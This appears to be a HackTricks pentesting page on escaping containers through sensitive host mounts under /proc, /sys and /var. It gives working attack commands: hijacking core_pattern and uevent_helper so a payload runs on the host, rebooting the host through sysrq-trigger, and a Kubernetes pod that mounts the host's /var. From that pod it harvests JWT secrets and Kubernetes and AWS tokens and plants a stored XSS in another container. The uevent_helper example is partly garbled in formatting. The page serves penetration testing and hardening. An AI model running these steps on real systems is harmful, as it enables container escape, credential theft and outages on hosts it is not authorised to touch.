# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

The exposure of `/proc`, `/sys`, and `/var` without proper namespace isolation introduces significant security risks, including attack surface enlargement and information disclosure. These directories contain sensitive files that, if misconfigured or accessed by an unauthorized user, can lead to container escape, host modification, or provide information aiding further attacks. For instance, incorrectly mounting `-v /proc:/host/proc` can bypass AppArmor protection due to its path-based nature, leaving `/host/proc` unprotected.

**You can find further details of each potential vuln in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## procfs Vulnerabilities

### `/proc/sys`

This directory permits access to modify kernel variables, usually via `sysctl(2)`, and contains several subdirectories of concern:

#### **`/proc/sys/kernel/core_pattern`**

- Described in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Allows defining a program to execute on core-file generation with the first 128 bytes as arguments. This can lead to code execution if the file begins with a pipe `|`.
- **Testing and Exploitation Example**:

  ```bash
  [ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
  cd /proc/sys/kernel
  echo "|$overlay/shell.sh" > core_pattern # Set custom handler
  sleep 5 && ./crash & # Trigger handler
  ```

#### **`/proc/sys/kernel/modprobe`**

- Detailed in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Contains the path to the kernel module loader, invoked for loading kernel modules.
- **Checking Access Example**:

  ```bash
  ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
  ```

#### **`/proc/sys/vm/panic_on_oom`**

- Referenced in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- A global flag that controls whether the kernel panics or invokes the OOM killer when an OOM condition occurs.

#### **`/proc/sys/fs`**

- As per [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contains options and information about the file system.
- Write access can enable various denial-of-service attacks against the host.

#### **`/proc/sys/fs/binfmt_misc`**

- Allows registering interpreters for non-native binary formats based on their magic number.
- Can lead to privilege escalation or root shell access if `/proc/sys/fs/binfmt_misc/register` is writable.
- Relevant exploit and explanation:
  - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
  - In-depth tutorial: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Others in `/proc`

#### **`/proc/config.gz`**

- May reveal the kernel configuration if `CONFIG_IKCONFIG_PROC` is enabled.
- Useful for attackers to identify vulnerabilities in the running kernel.

#### **`/proc/sysrq-trigger`**

- Allows invoking Sysrq commands, potentially causing immediate system reboots or other critical actions.
- **Rebooting Host Example**:

  ```bash
  echo b > /proc/sysrq-trigger # Reboots the host
  ```

#### **`/proc/kmsg`**

- Exposes kernel ring buffer messages.
- Can aid in kernel exploits, address leaks, and provide sensitive system information.

#### **`/proc/kallsyms`**

- Lists kernel exported symbols and their addresses.
- Essential for kernel exploit development, especially for overcoming KASLR.
- Address information is restricted with `kptr_restrict` set to `1` or `2`.
- Details in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Interfaces with the kernel memory device `/dev/mem`.
- Historically vulnerable to privilege escalation attacks.
- More on [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Represents the system's physical memory in ELF core format.
- Reading can leak host system and other containers' memory contents.
- Large file size can lead to reading issues or software crashes.
- Detailed usage in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Alternate interface for `/dev/kmem`, representing kernel virtual memory.
- Allows reading and writing, hence direct modification of kernel memory.

#### **`/proc/mem`**

- Alternate interface for `/dev/mem`, representing physical memory.
- Allows reading and writing, modification of all memory requires resolving virtual to physical addresses.

#### **`/proc/sched_debug`**

- Returns process scheduling information, bypassing PID namespace protections.
- Exposes process names, IDs, and cgroup identifiers.

#### **`/proc/[pid]/mountinfo`**

- Provides information about mount points in the process's mount namespace.
- Exposes the location of the container `rootfs` or image.

### `/sys` Vulnerabilities

#### **`/sys/kernel/uevent_helper`**

- Used for handling kernel device `uevents`.
- Writing to `/sys/kernel/uevent_helper` can execute arbitrary scripts upon `uevent` triggers.
- **Example for Exploitation**: %%%bash

  #### Creates a payload

  echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

  #### Finds host path from OverlayFS mount for container

  host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

  #### Sets uevent_helper to malicious helper

  echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

  #### Triggers a uevent

  echo change > /sys/class/mem/null/uevent

  #### Reads the output

  cat /output %%%

#### **`/sys/class/thermal`**

- Controls temperature settings, potentially causing DoS attacks or physical damage.

#### **`/sys/kernel/vmcoreinfo`**

- Leaks kernel addresses, potentially compromising KASLR.

#### **`/sys/kernel/security`**

- Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
- Access might enable a container to disable its MAC system.

#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**

- Exposes interfaces for interacting with EFI variables in NVRAM.
- Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.

#### **`/sys/kernel/debug`**

- `debugfs` offers a "no rules" debugging interface to the kernel.
- History of security issues due to its unrestricted nature.

### `/var` Vulnerabilities

The host's **/var** folder contains container runtime sockets and the containers' filesystems.
If this folder is mounted inside a container, that container will get read-write access to other containers' file systems
with root privileges. This can be abused to pivot between containers, to cause a denial of service, or to backdoor other
containers and applications that run in them.

#### Kubernetes

If a container like this is deployed with Kubernetes:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-mounts-var
  labels:
    app: pentest
spec:
  containers:
    - name: pod-mounts-var-folder
      image: alpine
      volumeMounts:
        - mountPath: /host-var
          name: noderoot
      command: [ "/bin/sh", "-c", "--" ]
      args: [ "while true; do sleep 30; done;" ]
  volumes:
    - name: noderoot
      hostPath:
        path: /var
```

Inside the **pod-mounts-var-folder** container:

```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```

The XSS was achieved:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Note that the container DOES NOT require a restart or anything. Any changes made via the mounted **/var** folder will be applied instantly.

You can also replace configuration files, binaries, services, application files, and shell profiles to achieve automatic (or semi-automatic) RCE.

##### Access to cloud credentials

The container can read K8s serviceaccount tokens or AWS webidentity tokens
which allows the container to gain unauthorized access to K8s or cloud:

```bash
/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
<SNIP>
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
```

#### Docker

The exploitation in Docker (or in Docker Compose deployments) is exactly the same, except that usually
the other containers' filesystems are available under a different base path:

```bash
$ docker info | grep -i 'docker root\|storage driver'
 Storage Driver: overlay2
 Docker Root Dir: /var/lib/docker
```

So the filesystems are under `/var/lib/docker/overlay2/`:

```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```

#### Note

The actual paths may differ in different setups, which is why your best bet is to use the **find** command to
locate the other containers' filesystems and SA / web identity tokens



### References

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}



